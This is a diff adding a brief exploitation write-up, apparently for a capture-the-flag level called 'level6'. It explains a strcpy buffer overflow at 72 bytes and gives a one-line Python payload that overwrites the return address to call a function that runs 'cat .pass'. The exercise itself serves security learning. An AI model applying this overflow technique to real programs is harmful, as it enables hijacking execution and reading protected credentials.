@@ -1,0 +1,5 @@
+We can see that the binary is crashing after 72 characters in strcpy.
+We overflow the return value of strcpy so that will point on the address of the n function that call the system cat .pass.
+We replace the return value with address of n function.
+
+$> ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
